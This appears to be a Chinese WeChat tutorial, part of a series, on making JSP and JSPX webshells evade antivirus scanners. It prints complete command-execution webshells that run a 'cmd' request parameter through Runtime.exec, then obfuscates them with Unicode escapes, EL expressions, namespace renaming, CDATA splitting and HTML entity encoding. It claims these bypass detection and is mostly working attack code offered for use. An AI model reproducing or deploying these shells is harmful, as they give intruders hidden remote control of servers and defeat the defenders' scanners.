<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dgC82XkTgmDj3o3E0stMHg)

编码免杀
====

Unicode 编码
----------

jsp 支持 unicode 编码，如果杀软不支持 unicode 查杀的话，基本上都能绕过

```
<%@ page language="java" contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"%><%@ page import="java.io.*"%><%  \uuuu0053\uuuu0074\uuuu0072\uuuu0069\uuuu006e\uuuu0067\uuuu0020\uuuu0063\uuuu006d\uuuu0064\uuuu0020\uuuu003d\uuuu0020\uuuu0072\uuuu0065\uuuu0071\uuuu0075\uuuu0065\uuuu0073\uuuu0074\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0050\uuuu0061\uuuu0072\uuuu0061\uuuu006d\uuuu0065\uuuu0074\uuuu0065\uuuu0072\uuuu0028\uuuu0022\uuuu0063\uuuu006d\uuuu0064\uuuu0022\uuuu0029\uuuu003b\uuuu0050\uuuu0072\uuuu006f\uuuu0063\uuuu0065\uuuu0073\uuuu0073\uuuu0020\uuuu0070\uuuu0072\uuuu006f\uuuu0063\uuuu0065\uuuu0073\uuuu0073\uuuu0020\uuuu003d\uuuu0020\uuuu0052\uuuu0075\uuuu006e\uuuu0074\uuuu0069\uuuu006d\uuuu0065\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0052\uuuu0075\uuuu006e\uuuu0074\uuuu0069\uuuu006d\uuuu0065\uuuu0028\uuuu0029\uuuu002e\uuuu0065\uuuu0078\uuuu0065\uuuu0063\uuuu0028\uuuu0063\uuuu006d\uuuu0064\uuuu0029\uuuu003b\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0020\uuuu0069\uuuu0073\uuuu0020\uuuu003d\uuuu0020\uuuu0070\uuuu0072\uuuu006f\uuuu0063\uuuu0065\uuuu0073\uuuu0073\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0028\uuuu0029\uuuu003b\uuuu0042\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0020\uuuu0062\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0020\uuuu003d\uuuu0020\uuuu006e\uuuu0065\uuuu0077\uuuu0020\uuuu0042\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0028\uuuu006e\uuuu0065\uuuu0077\uuuu0020\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0028\uuuu0069\uuuu0073\uuuu0029\uuuu0029\uuuu003b\uuuu0053\uuuu0074\uuuu0072\uuuu0069\uuuu006e\uuuu0067\uuuu0020\uuuu0072\uuuu0020\uuuu003d\uuuu0020\uuuu006e\uuuu0075\uuuu006c\uuuu006c\uuuu003b\uuuu0077\uuuu0068\uuuu0069\uuuu006c\uuuu0065\uuuu0028\uuuu0028\uuuu0072\uuuu0020\uuuu003d\uuuu0020\uuuu0062\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu002e\uuuu0072\uuuu0065\uuuu0061\uuuu0064\uuuu004c\uuuu0069\uuuu006e\uuuu0065\uuuu0028\uuuu0029\uuuu0029\uuuu0021\uuuu003d\uuuu006e\uuuu0075\uuuu006c\uuuu006c\uuuu0029\uuuu007b\uuuu0072\uuuu0065\uuuu0073\uuuu0070\uuuu006f\uuuu006e\uuuu0073\uuuu0065\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0057\uuuu0072\uuuu0069\uuuu0074\uuuu0065\uuuu0072\uuuu0028\uuuu0029\uuuu002e\uuuu0070\uuuu0072\uuuu0069\uuuu006e\uuuu0074\uuuu006c\uuuu006e\uuuu0028\uuuu0072\uuuu0029\uuuu003b\uuuu007d%>
```

注意这里的 \ uuuu00 可以换成 \ uuuu00uuu... 可以跟多个 u 达到绕过的效果

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrKc5NyK3F3JetToFsuKy6MvM3vt5oINViaycTyl1b3SmapRVOz2HwUFQ/640?wx_fmt=png)

将代码（除 page 以及标签）进行 unicode 编码，并条件到 <%%> 标签中，即可执行 webshell

在线 unicode 编码转换：https://3gmfw.cn/tools/unicodebianmazhuanhuanqi/

注意用此在线 unicode 编码后内容会存在 /ua ，需要手动删除，负责无法正常运行

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4Jricdyw6kuEvZxWDgWjyG0YQEqbian5ykrYw2edTgMU7zmlBibPYGm0dLvg/640?wx_fmt=png)

可以看到依旧执行成功

查杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrWicfic6CYibQBqTGaKy0PpgxRibzDCSXNAGWVQD9yicqNhMU6Y9A6m5QbCw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrWz3kpxncJiaVbPlxRLcBhlqJOHwOjgDE76GRRvTOGLxxZkhOMjVXSmw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4Jr2zJDso8wog6fgmsF2Gn2eeTjUu25c7uujZ2iafAUwbALicicLdUpdSpMQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrjXzbmy2eW3QmbiblwWdPk5EeI81qk2ufSiadMvMlmpnYviaVqVuuS6cMA/640?wx_fmt=png)

这个基本上是通杀了属实是，但由于特征过于明显，如果人工查杀的话，很容易被发现

CDATA 特性
--------

这里是要是利用 jspx 的进行进行免杀，jspx 其实就是 xml 格式的 jsp 文件

在 jspx 中，可以利用 jsp:scriptlet 来代替 <%%>

```
<%@ page import="java.io.InputStream" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStreamReader" %><%@page language="java" pageEncoding="utf-8" %><jsp:scriptlet>  String cmd = request.getParameter("cmd");  Process process = Runtime.getRuntime().exec(cmd);  InputStream is = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }</jsp:scriptlet>
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrOs5iahDNO2AYJA25YwlaJFxaRN060jUFVmP6ZyScUsNmL3gSEBQQbmA/640?wx_fmt=png)

当 jsp:scriptlet 被过滤时可以利用 EL 表达式，达到绕过的效果

```
${Runtime.getRuntime().exec(param.cmd)}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrxRm7h52za9yxBob6XeP64HrBvtQLFLEe2jesVzcq7pBqSwZ1TVTA0A/640?wx_fmt=png)

EL 表达式的 11 个隐含对象

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrBZIBzJgwibOP79ibwDSasOfKoCb73BIT3Ycc9LfKmcpZMXEs2yXu2LpA/640?wx_fmt=png)

其他情况：

```
利用命令空间改名去绕过<demo:root xmlns:bbb="http://java.sun.com/JSP/Page"  version="1.2"><demo:scriptlet>Runtime.getRuntime().exec(pageContext.request.getParameter("cmd"));</demo:scriptlet></demo:root>利用<jsp:expression>绕过<jsp:root xmlns:bbb="http://java.sun.com/JSP/Page"  version="1.2">   <jsp:expression>   Runtime.getRuntime().exec(pageContext.request.getParameter("cmd"));   </jsp:expression></jsp:root>
```

以上是 jsp 的一些特性，下面开始正式讲解 CDATA

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrHKCe8RibTdhCc40vZFPp09fknLOTE2DWxEoKxfa9Ne6Yju0SqrFiaiavA/640?wx_fmt=png)

```
说人话就是<![CDATA[与]]>只要能配对就相互抵消，其他不变，因此就可以说多了一个混淆的方式，有点类似多行注释在一行中使用（sql注入绕过waf），但是这个特征可以将关键字，函数进行分割，让其能混淆的空间变的更大
```

下面是用 xml 格式的 jsp 文件

```
<?xml version="1.0" encoding="UTF-8"?><jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"          version="2.0">  <jsp:directive.page contentType="text/html"/>  <jsp:scriptlet>  String cmd = request.getParameter("cmd");  Process process = Runtime.getRuntime().exec(cmd);  java.io.InputStream is = process.getInputStream();  java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }</jsp:scriptlet></jsp:root>
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrG7ibOa9BXzfm00880VlhYsFmDX7QHZ59wic34a2tegyeTxz6NsfFWaUQ/640?wx_fmt=png)

可以看到这里是能正常运行的，接下来文件使用 CDATA 进行混淆

```
<?xml version="1.0" encoding="UTF-8"?><jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"          version="2.0">  <jsp:directive.page contentType="text/html"/>  <jsp:scriptlet>  String cmd = requ<![CDATA[est.get]]>Parameter("cmd");  Process process = Ru<![CDATA[ntime.getRunt]]>ime().exec(cmd);  java.io.InputStream is = process.getInputStream();  java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }</jsp:scriptlet></jsp:root>
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrtCR73BbusdYQItLXOL975vlN0hRNPeN9SU1r4dhpRXjm794V2NQU4w/640?wx_fmt=png)

依旧是能成功运行的，但是我们可以 requst 和 Runtime 这些类名都被插入了 CDATA，从而消除了特征

免杀效果:

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4Jr0EvGoRmdr38VrxORNKZqoicv2u2BINENwxJJzlcZj2jW03qKPvNFR3w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrV8BzCGbINia8kVoN5Qwia7BV0sved0Q1icUmVr7ribu0ICAhThibQDkMFJA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4Jr7GQQo0jOxgdr4jlJv3Z5oeuprUZPZ20zHtdTWISMYSpF5TegMh9lvw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrUKV9akoECkKseNOaR3WfGX6Ny1k4bVsEBAAD6TjPQCUSJ4hXys0XFw/640?wx_fmt=png)

HTML 编码
-------

这里 HTML 编码免杀与 jspx 的特效有关，前面的 CDATA 设计到了 jspx 的相关知识，由此 CDATA 的免杀就在上文讲了

在 XML 里可以通过 html 实体编码来对特殊字符转义，jspx 同样继承了该特性，由此 jspx 就具有识别 html 实体编码，接下来我们就利用上面的免杀马进行进一步的混淆

```
<?xml version="1.0" encoding="UTF-8"?><jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"          version="2.0">  <jsp:directive.page contentType="text/html"/>  <jsp:scriptlet>  String cmd = requ<![CDATA[est.get]]>Parameter("cmd");  Process process = Ru<![CDATA[ntime.getRunt]]>ime().exec(cmd);  java.io.InputStream is = process.getInputStream();  java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }</jsp:scriptlet></jsp:root>
```

注意：含有 CDATA 的内容是不能进行 html 实体编码的，反之 html 实体编码后的内容也不能插入 CDATA，否则无法执行

在线 html 实体编码：https://www.qqxiuzi.cn/bianma/zifushiti.php

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JriaibhVtlzDOfTzdxUWcqrDxQqo1KH9iaPpRmgV8tny6Rj7zEq4HgcSDcg/640?wx_fmt=png)

可以看到依旧可以正常运行

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)

往期推荐

[

域内批量解析 chrome 浏览器



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502332&idx=1&sn=d05b68496442ee875bbe4d45398a4650&chksm=ce677340f910fa563cf2fa0b3914bb019a1cdc22997ac2b9a3022cd8151aedffa248312fa202&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（五）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502241&idx=1&sn=5c767ad655dd6914a3a594169dfeafc2&chksm=ce67731df910fa0b2d971eff4d356b443e9f21b3a99e2e074b62f0a74d55a1e0d5a5536ed777&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（四）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247501017&idx=1&sn=aa602658159907822f7c59c85c427576&chksm=ce677e65f910f773422d910e57e8fa4cb2f0278b88319945839cd8f3a2262c6dc264e7767dcd&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（三）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500845&idx=1&sn=73e9a559ce1c1d48b6895d87cfcda078&chksm=ce677e91f910f787c4c8c403dfb3e23027bb379e47053a1b3f489d8487d86b75f7dd6286fa05&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[什么？你还不会 webshell 免杀？（一）](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)